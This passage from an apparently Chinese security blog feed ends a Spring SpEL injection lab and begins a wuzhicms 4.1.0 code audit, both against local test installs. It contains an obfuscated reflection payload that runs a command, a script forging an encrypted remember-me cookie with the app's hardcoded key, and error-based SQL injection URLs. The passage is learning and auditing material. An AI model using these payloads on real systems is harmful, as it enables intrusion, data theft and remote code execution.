class="hljs-keyword">public</span> String <span class="hljs-title function_">admin</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = &quot;remember-me&quot;, required = false)</span> String rememberMeValue, HttpSession session, Model model)</span> &#123;<br><span class="hljs-comment">/*  36 */</span>     <span class="hljs-keyword">if</span> (rememberMeValue != <span class="hljs-literal">null</span> &amp;&amp; !rememberMeValue.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br><span class="hljs-comment">/*  37 */</span>       <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userConfig.decryptRememberMe(rememberMeValue);<br><span class="hljs-comment">/*  38 */</span>       <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">/*  39 */</span>         session.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, str);<br><span class="hljs-comment">/*     */</span>       &#125;<br><span class="hljs-comment">/*     */</span>     &#125; <br><span class="hljs-comment">/*     */</span>     <br><span class="hljs-comment">/*  43 */</span>     <span class="hljs-type">Object</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;username&quot;</span>);<br><span class="hljs-comment">/*  44 */</span>     <span class="hljs-keyword">if</span> (username == <span class="hljs-literal">null</span> || username.toString().equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br><span class="hljs-comment">/*  45 */</span>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/login&quot;</span>;<br><span class="hljs-comment">/*     */</span>     &#125;<br><span class="hljs-comment">/*     */</span>     <br><span class="hljs-comment">/*  48 */</span>     model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>, getAdvanceValue(username.toString()));<br><span class="hljs-comment">/*  49 */</span>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-comment">/*     */</span>   &#125;<br></code></pre></td></tr></table></figure><p>因此，我们只需输入admin&#x2F;admin并勾选remember-me选项,点击登录，然后在请求包中修改Cookie内容即可。</p><p>先构造payload</p><p>由于黑名单的限制，这里利用java反射机制调用所需类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRu&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><p>分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. <span class="hljs-string">&#x27;&#x27;</span>.getClass() → java.lang.String.class<br>   <span class="hljs-string">&#x27;&#x27;</span> 是空字符串，调用 .getClass() 获取 java.lang.String.class 对象（即 Class&lt;String&gt;）<br>2. forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>) → Runtime.class<br>   反射方式加载 java.lang.Runtime 类。<br>   等价于：Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>3. .getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>.getClass()) → 获取 <span class="hljs-built_in">exec</span> 方法<br>   .getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>   表示获取 Runtime 实例的 <span class="hljs-built_in">exec</span>(String) 方法。<br>4. .getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(null) → 获取 Runtime 实例<br>   通过调用静态方法 Runtime.getRuntime() 得到一个运行时实例:<br>   Runtime runtime=Runtime.getRuntime();<br>   这里的反射方式：.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(null)<br>5. .invoke(..., <span class="hljs-string">&quot;calc&quot;</span>) → 执行命令<br>   runtime.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>   <br>最终等价于 Java 代码：Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>再将其加密，加密代码在Encryptor.java文件中</p><p><img src="/img/spel/s03.png"></p><p>已知key是c0dehack1nghere1，initVector是0123456789abcdef，value是要加密的值</p><p>写一个加密脚本</p><p>先将value设置为admin，加密后与数据包中remember-me的值比较</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        String key=<span class="hljs-string">&quot;c0dehack1nghere1&quot;</span>;<br>        String initVector=<span class="hljs-string">&quot;0123456789abcdef&quot;</span>;<br>        String value=<span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-comment">/*    */</span>     <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">/* 15 */</span>       <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(initVector.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>        <span class="hljs-comment">/* 16 */</span>       <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">skeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(key.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>), <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 18 */</span>       <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5PADDING&quot;</span>);<br>        <span class="hljs-comment">/* 19 */</span>       cipher.init(<span class="hljs-number">1</span>, skeySpec, iv);<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 21 */</span>       <span class="hljs-type">byte</span>[] encrypted = cipher.doFinal(value.getBytes());<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 23 */</span>       System.out.println(Base64.getUrlEncoder().encodeToString(encrypted));<br>        <span class="hljs-comment">/* 24 */</span>     &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>        <span class="hljs-comment">/* 28 */</span>       System.out.println(ex.getMessage());<br>        <span class="hljs-comment">/*    */</span>     &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到加密结果与数据包中值是相同的，说明脚本没有问题</p><p><img src="/img/spel/s04.png"></p><p><img src="/img/spel/s05.png"></p><p>将脚本中value值更改为payload</p><p>运行后抓取数据包，将remember-me的值改为加密后结果</p><p>发送数据包，成功弹出计算器</p><p><img src="/img/spel/s06.png"></p><h4 id="通过SpEL注入内存马"><a href="#通过SpEL注入内存马" class="headerlink" title="通过SpEL注入内存马"></a>通过SpEL注入内存马</h4><p><a href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/">https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/A_art_xiang/article/details/134370029">Spring-SpEL表达式超级详细使用全解-CSDN博客</a></p><p><a href="https://xz.aliyun.com/news/8744">SpEL注入RCE分析与绕过-先知社区 (aliyun.com)</a></p><p><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a></p><p><a href="https://www.cnblogs.com/qiushuo/p/18393442">https://www.cnblogs.com/qiushuo/p/18393442</a></p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms-4.1.0 代码审计(php)</title>
    <link href="/2025/07/19/wuzhicms-4.1.0%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/"/>
    <url>/2025/07/19/wuzhicms-4.1.0%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/</url>
    
    <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>在www&#x2F;configs&#x2F;default_mysql_config.php更改对应配置信息</p><p><img src="/img/wuzhicms/w01.png"></p><p>新建一个名为wuzhicms的数据库</p><p>按照安装说明，访问域名：<a href="http://域名/install/">http:&#x2F;&#x2F;域名&#x2F;install&#x2F;</a> 进行安装</p><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><h4 id="初步"><a href="#初步" class="headerlink" title="初步"></a>初步</h4><h5 id="判断路由关系"><a href="#判断路由关系" class="headerlink" title="判断路由关系"></a>判断路由关系</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=index&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p>在coreframe&#x2F;app文件夹中，m表示对应的模块，f表示对应的类，v表示类中的方法</p><h5 id="传值方法"><a href="#传值方法" class="headerlink" title="传值方法"></a>传值方法</h5><p>此源码传值是利用GLOBALS</p><p><img src="/img/wuzhicms/w10.png"></p><h5 id="引用数据库模板插件等-查看安装说明"><a href="#引用数据库模板插件等-查看安装说明" class="headerlink" title="引用数据库模板插件等(查看安装说明)"></a>引用数据库模板插件等(查看安装说明)</h5><p>查看cms说明可以了解到数据库是mysql</p><p>翻看目录结构可以看到有templet文件夹，可以关注是否有ssti注入</p><p>在说明中看到</p><p><img src="/img/wuzhicms/w02.png"></p><p>源码中禁止附件目录运行php，说明大概率是爆出过文件上传漏洞，一会可以尝试 .htaccess文件配合图片马上传</p><h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><p><code>admin/</code> — 后台控制器或配置</p><p><code>fields/</code> — 字段类型定义与处理器</p><p><code>libs/</code> — 核心类库和工具函数</p><h5 id="自动化工具使用"><a href="#自动化工具使用" class="headerlink" title="自动化工具使用"></a>自动化工具使用</h5><p>不好用，只能辅助</p><p>先用自动化工具扫描一下</p><p><img src="/img/wuzhicms/w03.png"></p><p>控制类主要在coreframe&#x2F;app目录中，着重关注</p><h5 id="搜索敏感函数关键字"><a href="#搜索敏感函数关键字" class="headerlink" title="搜索敏感函数关键字"></a>搜索敏感函数关键字</h5><p><a href="https://www.cnblogs.com/murkuo/p/15660517.html">php敏感函数速查表 - MuRKuo - 博客园 (cnblogs.com)</a></p><h4 id="后台phpinfo-敏感信息泄露"><a href="#后台phpinfo-敏感信息泄露" class="headerlink" title="后台phpinfo()敏感信息泄露"></a>后台phpinfo()敏感信息泄露</h4><p>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php</p><p><img src="/img/wuzhicms/w04.png"></p><p>直接访问url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=index&amp;v=phpinfo&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w05.png"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>全局搜索select时发现coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;mysql.class.php中</p><p>get_list与get_one方法有未过滤的sql语句</p><p><img src="/img/wuzhicms/w11.png"></p><p>全局搜素是否有调用这两个函数的方法，并且传入参数可控</p><p>查看是否能访问</p><h5 id="后台注入01"><a href="#后台注入01" class="headerlink" title="后台注入01"></a>后台注入01</h5><p>类似的listing方法有很多，不一一列出</p><p>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;copyfrom.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listing</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>        <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;copyfrom&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>);<br><span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>        <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br><span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;copyfrom_listing&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到keywords参数可控</p><p>构造url尝试访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p>能看到是友链操作列表查询</p><p>测试一下</p><p><img src="/img/wuzhicms/w12.png"></p><p>看到单引号报错，使用报错注入</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost/wuzhicms/www/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms&amp;keywords=1%25%27+or+1%3dextractvalue(1%2cconcat(0x7e%2c(<span class="hljs-keyword">select</span>+database())))+%23<br></code></pre></td></tr></table></figure><p>顺利注入</p><p><img src="/img/wuzhicms/w13.png"></p><h5 id="后台注入02"><a href="#后台注入02" class="headerlink" title="后台注入02"></a>后台注入02</h5><p>coreframe&#x2F;app&#x2F;promote&#x2F;admin&#x2F;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>       <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>       <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>       <span class="hljs-variable">$fieldtype</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;fieldtype&#x27;</span>];<br>       <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fieldtype</span>==<span class="hljs-string">&#x27;place&#x27;</span>) &#123;<br>           <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote_place&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;pid ASC&#x27;</span>);<br>           <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>           <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>           <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listingplace&#x27;</span>);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `<span class="hljs-subst">$fieldtype</span>` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote&#x27;</span>,<span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br>           <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>           <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>           <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listing&#x27;</span>);<br>       &#125;<br></code></pre></td></tr></table></figure><p>这个直接全局搜索是不显示的，全局搜索时可以看到只显示到coreframe&#x2F;app&#x2F;pay目录，剩下的需要手动查找</p><p>直接搜索url，发现有报错提示</p><p><img src="/img/wuzhicms/w14.png"></p><p>同样使用报错注入</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost/wuzhicms/www/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=1%25%27+or+1%3dextractvalue(1%2cconcat(0x7e%2c(<span class="hljs-keyword">select</span>+database())))+%23<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w15.png"></p><h4 id="后台任意文件删除"><a href="#后台任意文件删除" class="headerlink" title="后台任意文件删除"></a>后台任意文件删除</h4><p>搜索unlink关键字</p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p><p>del()方法对用户传入的url参数无过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable">$url</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) ? <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span> &amp;&amp; !<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;delete success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">1000</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-string">&#x27;url del &#x27;</span> . <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(ATTACHMENT_URL, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$path</span>) &#123;<br>                <span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-variable">$path</span>);<br>                <span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,id&#x27;</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$att_info</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span 